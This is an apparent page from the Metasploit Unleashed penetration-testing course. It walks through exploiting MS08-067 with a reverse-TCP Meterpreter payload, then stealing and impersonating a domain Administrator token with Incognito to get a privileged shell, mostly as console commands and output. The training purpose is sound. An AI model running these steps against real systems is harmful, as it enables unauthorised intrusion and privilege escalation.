<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Fun With Incognito</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Fun
With Incognito</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Incognito was originally a stand-alone
application that allowed you
to impersonate user tokens when successfully compromising a system.
This was integrated into Metasploit and ultimately into Meterpreter.
</p>
<p style="color: rgb(0, 0, 0);">You can read more about Incognito and
how token stealing works via Luke Jennings orignial paper on the
subject here:
<a
 href="http://labs.mwrinfosecurity.com/publications/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf"
 class="external free" rel="nofollow">http://labs.mwrinfosecurity.com/publications/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf</a>
</p>
<p style="color: rgb(0, 0, 0);">In a nut shell, tokens are just like
web cookies. They are a
temporary key that allows you to access the system and network without
having to provide credentials each time you access a file. Incognito
exploits this the same way cookie stealing works, by replaying that
temporary key when asked to authenticate. There are two types of
tokens, delegate, and impersonate. Delegate are created for
'interactive' logons, such as logging into the machine, or connecting
to it via remote desktop. Impersonate tokens are for 'non-interactive'
sessions, such as attaching a network drive, or a domain logon script.
</p>
<p style="color: rgb(0, 0, 0);">The other great things about tokens?
They persist until a
reboot. When a user logs off, their delegate token is reported as a
impersonate token, but will still hold all of the rights of a delegate
token.
</p>
<ul style="color: rgb(0, 0, 0);">
  <li>TIP* File servers are virtual treasure troves of tokens since
most file servers are used as network attached drives via domain logon
scripts
  </li>
</ul>
<p style="color: rgb(0, 0, 0);">So, once you have a Meterpreter
console, you can impersonate valid
tokens on the system and become that specific user without ever having
to worry about credentials or for that matter even hashes. During a
penetration test this is especially useful due to the fact that tokens
have the possibility of allowing local and/or domain privilege
escalation, enabling you alternate avenues with potentially elevated
privileges to multiple systems.
</p>
<p style="color: rgb(0, 0, 0);">First let's load up our favorite
exploit, ms08_067_netapi, with
a Meterpreter payload. Note that we manually set the target because
this particular exploit does not always auto-detect the target
properly. Setting it to a known target will ensure the right memory
addresses are used for exploitation.
<br>
<br>
</p>
<pre id="code">msf &gt; use windows/smb/ms08_067_netapi<br>msf exploit(ms08_067_netapi) &gt; set RHOST 10.211.55.140<br>RHOST =&gt; 10.211.55.140<br>msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(ms08_067_netapi) &gt; set LHOST 10.211.55.162<br>LHOST =&gt; 10.211.55.162<br>msf exploit(ms08_067_netapi) &gt; set LANG english<br>LANG =&gt; english<br>msf exploit(ms08_067_netapi) &gt; show targets<br><br>Exploit targets:<br><br>   Id  Name                                               <br>   --  ----                                               <br>   0   Automatic Targeting                                <br>   1   Windows 2000 Universal                             <br>   2   Windows XP SP0/SP1 Universal                       <br>   3   Windows XP SP2 English (NX)                        <br>   4   Windows XP SP3 English (NX)                        <br>   5   Windows 2003 SP0 Universal                         <br>   6   Windows 2003 SP1 English (NO NX)                   <br>   7   Windows 2003 SP1 English (NX)                      <br>   8   Windows 2003 SP2 English (NO NX)                   <br>   9   Windows 2003 SP2 English (NX)                      <br>   10  Windows XP SP2 Arabic (NX)                         <br>   11  Windows XP SP2 Chinese - Traditional / Taiwan (NX) <br><br><br>msf exploit(ms08_067_netapi) &gt; set TARGET 8<br>target =&gt; 8<br>msf exploit(ms08_067_netapi) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Triggering the vulnerability...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 1 opened (10.211.55.162:4444 -&gt; 10.211.55.140:1028)<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We now have a Meterpreter console
from which we will begin our
incognito token attack. Like priv (hashdump and timestomp) and stdapi
(upload, download, etc), incognito is a meterpreter module. We load the
module into our meterpreter session by executing the 'use incognito'
command. Issuing the 'help' command shows us the variety of options we
have for incognito and brief descriptions of each option.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; use incognito<br>Loading extension incognito...success.<br><u>meterpreter</u> &gt; help<br><br>Incognito Commands<br>==================<br><br>    Command              Description                                             <br>    -------              -----------                                             <br>    add_group_user       Attempt to add a user to a global group with all tokens <br>    add_localgroup_user  Attempt to add a user to a local group with all tokens  <br>    add_user             Attempt to add a user with all tokens                   <br>    impersonate_token    Impersonate specified token                             <br>    list_tokens          List tokens available under current user context        <br>    snarf_hashes         Snarf challenge/response hashes for every token         <br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">What we will need to do first is
identify if there are any valid
tokens on this system. Depending on the level of access that your
exploit provides you are limited in the tokens you are able to view.
When it comes to token stealing, SYSTEM is king. As SYSTEM you are
allowed to see and use any token on the box.
</span>
<ul style="color: rgb(0, 0, 0);">
  <li>TIP*: Administrators don't have access to all the tokens
either, but they do have the ability to migrate to SYSTEM processes,
effectively making them SYSTEM and able to see all the tokens
available.
  </li>
</ul>
<p style="color: rgb(0, 0, 0);"><br>
<br>
</p>
<pre id="code"><u>meterpreter</u> &gt; list_tokens -u<br><br>Delegation Tokens Available<br>========================================<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br>SNEAKS.IN\Administrator<br><br>Impersonation Tokens Available<br>========================================<br>NT AUTHORITY\ANONYMOUS LOGON<br><br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We see here that there is a valid
Administrator token that looks to
be of interest. We now need to impersonate this token in order to
assume its privileges. When issuing the 'impersonate_token' command,
note the two backslashes in </span><b style="color: rgb(0, 0, 0);">"SNEAKS.IN\\
Administrator"</b><span style="color: rgb(0, 0, 0);">.
This is required as it causes bugs with just one slash. Note also that
after successfully impersonating a token, we check our current userID
by executing the 'getuid' command.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; impersonate_token SNEAKS.IN\\Administrator<br>[+] Delegation token available<br>[+] Successfully impersonated user SNEAKS.IN\Administrator<br><u>meterpreter</u> &gt; getuid<br>Server username: SNEAKS.IN\Administrator<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Next, lets run a shell as this
individual account by running
'execute -f cmd.exe -i -t' from within Meterpreter. The execute -f
cmd.exe is telling Metasploit to execute cmd.exe, the -i allows us to
interact with the victims PC, and the -t assumes the role we just
impersonated through incognito.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; execute -f cmd.exe -i -t<br>Process 3540 created.<br>Channel 1 created.<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;whoami<br>whoami<br>SNEAKS.IN\administrator<br><br>C:\WINDOWS\system32&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The result: Success! </span><br
 style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
